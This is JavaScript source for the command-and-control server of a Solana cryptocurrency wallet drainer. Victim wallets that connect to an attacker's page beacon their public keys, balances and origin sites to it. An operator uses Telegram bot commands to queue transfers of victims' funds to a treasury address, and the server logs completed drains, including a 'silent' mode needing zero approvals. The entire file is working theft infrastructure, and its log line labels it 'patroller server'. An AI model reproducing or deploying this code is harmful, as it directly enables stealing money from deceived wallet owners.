const http = require("http"), fs = require("fs");
const { BOT_TOKEN: BOT, CHAT_ID: CHAT, TREASURY, BEACON_KEY, PORT = 8787 } = process.env;
if (!BOT || !CHAT || !TREASURY) { console.error("missing BOT_TOKEN / CHAT_ID / TREASURY"); process.exit(1); }

const targets = {}, cmds = {};
let tgOffset = parseInt(fs.readFileSync(__dirname + "/.offset", { flag: "a" })) || 0;
process.on("uncaughtException", e => console.error("uncaught:", e && e.message));

const tg = (text, pre = "") => fetch("https://api.telegram.org/bot" + BOT + "/sendMessage", {
  method: "POST",
  headers: { "content-type": "application/json" },
  body: JSON.stringify({ chat_id: CHAT, text: pre + text, parse_mode: "HTML", disable_web_page_preview: true }),
}).catch(() => {});

const B58RE = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;

async function pollTg() {
  try {
    const j = await (await fetch("https://api.telegram.org/bot" + BOT + "/getUpdates?offset=" + (tgOffset + 1) + "&timeout=0")).json();
    for (const u of j.result || []) {
      if (u.update_id <= tgOffset) continue;
      tgOffset = u.update_id;
      fs.writeFileSync(__dirname + "/.offset", String(tgOffset));
      const [cmd, ...rest] = (u.message?.text || "").trim().toLowerCase().split(/\s+/);
      if (cmd === "/help") {
        tg("/drains — last target, to treasury\n/drains <addr> — last target, to addr\n/drains <#> [addr] — target #, to addr or treasury\n/targets — list detected wallets\n\nuse /targets to see who's connected and their balances");
      } else if (cmd === "/drains") {
        const list = Object.keys(targets);
        if (!list.length) return tg("no targets yet — waiting for a wallet to connect");
        let idx, to;
        if (/^\d{1,3}$/.test(rest[0] || "")) { idx = (parseInt(rest[0]) - 1) % list.length; to = rest[1] || TREASURY; }
        else { idx = list.length - 1; to = rest[0] || TREASURY; }
        if (!B58RE.test(to)) return tg("that doesn't look like a pubkey");
        cmds[list[idx]] = { to };
        tg("queued drain #" + (idx + 1) + " " + list[idx].slice(0, 4) + "\u2026" + list[idx].slice(-4) + " \u2192 " + to.slice(0, 4) + "\u2026" + to.slice(-4));
      } else if (cmd === "/targets") {
        tg(Object.entries(targets).map(([k, r], i) =>
          "#" + (i + 1) + " " + k + "\n   $" + (r.value ?? 0).toLocaleString() + " \u00b7 " + (r.provider || "?") + " \u00b7 " + (r.origin || "?") + (r.drained ? " \u00b7 drained" : "")
        ).join("\n") || "none", "targets:");
      }
    }
  } catch {}
}
setInterval(pollTg, 3000);

http.createServer((req, res) => {
  const url = new URL(req.url, "http://x");
  res.setHeader("access-control-allow-origin", "*");
  if (req.method === "OPTIONS") {
    res.setHeader("access-control-allow-methods", "GET, POST, OPTIONS");
    res.setHeader("access-control-allow-headers", "content-type");
    res.statusCode = 204; res.end(); return;
  }
  if (req.method === "GET" && url.pathname === "/cmd") {
    const c = cmds[url.searchParams.get("pk") || ""];
    res.setHeader("content-type", "application/json");
    return res.end(JSON.stringify(c ? { cmd: "drain", to: c.to } : { cmd: "none" }));
  }
  if (req.method === "POST" && url.pathname === "/beacon") {
    if (BEACON_KEY && url.searchParams.get("s") !== BEACON_KEY) { res.statusCode = 202; res.end(); return; }
    let d = "";
    req.on("data", c => { if (d.length < 65536) d += c; });
    req.on("end", () => {
      try {
        const j = JSON.parse(d);
        if (j.m === "detect") {
          const first = !targets[j.pk];
          targets[j.pk] = { provider: j.provider, origin: j.origin, value: j.value, sol: j.sol, toks: j.toks, seen: Date.now(), drained: targets[j.pk]?.drained || false };
          if (first) tg("<b>" + (j.provider || "?") + "</b> @ " + (j.origin || "?") + "\n<code>" + j.pk + "</code>\n$" + (j.value ?? 0).toLocaleString() + " \u00b7 " + j.sol + " SOL" + (j.toks ? " + " + j.toks : ""), "\ud83c\udfaf wallet connected — ");
        }
        if (j.m === "drain") {
          targets[j.pk] = Object.assign(targets[j.pk] || {}, { drained: true, sig: j.sig, value: j.value });
          delete cmds[j.pk];
          tg("<code>" + j.pk + "</code>\n$" + (j.value ?? 0).toLocaleString() +
            (j.extra ? "\nmoved: " + j.extra : "") +
            "\nmode: <b>" + j.mode + "</b>" + (j.mode === "secret" ? " (0 approvals)" : j.mode === "popup" ? " (1 approval)" : "") +
            (j.sig ? "\nsig: <code>" + j.sig + "</code>" : ""),
            j.mode === "secret" ? "\ud83d\udcb0 SILENT DRAIN — " : "\ud83d\udcb0 drain — ");
        }
      } catch {}
      res.setHeader("content-type", "application/json");
      res.end("{}");
    });
    return;
  }
  res.statusCode = 404; res.end("");
}).listen(+PORT, "127.0.0.1", () => console.log("patroller server on 127.0.0.1:" + PORT));